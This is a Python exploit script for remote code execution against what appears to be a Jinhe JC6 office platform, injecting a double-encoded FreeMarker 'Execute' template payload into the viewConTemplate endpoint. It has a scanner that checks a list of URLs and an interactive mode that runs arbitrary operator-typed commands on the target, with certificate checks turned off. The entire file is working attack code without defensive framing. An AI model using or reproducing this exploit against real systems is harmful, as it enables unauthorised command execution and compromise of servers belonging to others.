import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%2528%2522arp%2520-a%2522%2529%257D%253C%252Fclob%253E&uuid=1"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and ' Internet' in response.text and '</clob>' in response.text:
                print(f"\033[31mDiscovered:{url}: JinheJC6_viewConTemplate_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                command = quote(quote(command))
                data = """moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%2528%2522{}%2522%2529%257D%253C%252Fclob%253E&uuid=1""".format(command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 200 and '<clob>' in response.text:
                            print(response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")